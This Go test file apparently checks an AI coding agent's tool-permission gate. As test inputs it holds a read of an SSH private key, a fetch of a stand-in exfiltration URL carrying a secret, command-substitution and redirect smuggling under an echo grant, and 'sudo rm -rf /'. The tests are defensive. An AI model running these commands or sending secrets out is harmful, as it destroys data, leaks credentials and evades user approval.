package tools

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"testing"
)

// asker records what it was asked and answers with the given decision.
func asker(d Decision, log *[]string) AskFunc {
	return func(tool, summary string) Decision {
		*log = append(*log, tool+"|"+summary)
		return d
	}
}

func TestReadFileGatesSecretsOutsideWorktree(t *testing.T) {
	work := t.TempDir()
	home := t.TempDir()
	t.Setenv("HOME", home)
	if err := os.MkdirAll(filepath.Join(home, ".ssh"), 0o700); err != nil {
		t.Fatal(err)
	}
	key := filepath.Join(home, ".ssh", "id_ed25519")
	if err := os.WriteFile(key, []byte("PRIVATE KEY"), 0o600); err != nil {
		t.Fatal(err)
	}
	inTree := filepath.Join(work, "main.go")
	if err := os.WriteFile(inTree, []byte("package main"), 0o644); err != nil {
		t.Fatal(err)
	}

	e := NewExecutor(work, ModeManual)
	var log []string
	out, isErr, err := e.Call(context.Background(), "read_file",
		json.RawMessage(`{"path":"`+key+`"}`), asker(Decision{}, &log))
	if err != nil {
		t.Fatal(err)
	}
	if !isErr || len(log) != 1 {
		t.Fatalf("ssh key read without a prompt: out=%q asked=%v", out, log)
	}

	log = nil
	if _, _, err := e.Call(context.Background(), "read_file",
		json.RawMessage(`{"path":"main.go"}`), asker(Decision{}, &log)); err != nil {
		t.Fatal(err)
	}
	if len(log) != 0 {
		t.Fatalf("worktree file prompted: %v", log)
	}
}

func TestWebFetchGatesNewHosts(t *testing.T) {
	e := NewExecutor(t.TempDir(), ModeManual)
	var log []string
	out, isErr, err := e.Call(context.Background(), "web_fetch",
		json.RawMessage(`{"url":"https://evil.example/?d=secret"}`), asker(Decision{}, &log))
	if err != nil {
		t.Fatal(err)
	}
	if !isErr || len(log) != 1 {
		t.Fatalf("exfil host fetched without a prompt: out=%q asked=%v", out, log)
	}
}

func TestGrantedWordCannotSmuggleSubstitutionOrRedirect(t *testing.T) {
	e := NewExecutor(t.TempDir(), ModeManual)
	e.SetBashPrefixes([]string{"echo"})

	for _, cmd := range []string{
		`echo $(rm -rf /tmp/x)`,
		"echo `id`",
		`echo pwned > main.go`,
		`echo ${HOME}`,
	} {
		var log []string
		if _, _, err := e.Call(context.Background(), "bash",
			json.RawMessage(`{"command":`+quote(cmd)+`}`), asker(Decision{}, &log)); err != nil {
			t.Fatal(err)
		}
		if len(log) == 0 {
			t.Fatalf("%q ran unprompted under an echo grant", cmd)
		}
	}

	var log []string
	if _, _, err := e.Call(context.Background(), "bash",
		json.RawMessage(`{"command":"echo 'plain > quoted'"}`), asker(Decision{}, &log)); err != nil {
		t.Fatal(err)
	}
	if len(log) != 0 {
		t.Fatalf("quoted redirect char should not force a prompt: %v", log)
	}
}

func TestPrefixGrantableRefusesInterpreters(t *testing.T) {
	for _, seg := range []string{"python -c 'x'", "bash script.sh", "sudo rm -rf /", "echo $(id)"} {
		if PrefixGrantable(seg) {
			t.Errorf("offered a blanket grant for %q", seg)
		}
	}
	if !PrefixGrantable("git status") {
		t.Error("git status should be grantable")
	}
}

func quote(s string) string {
	b, _ := json.Marshal(s)
	return string(b)
}
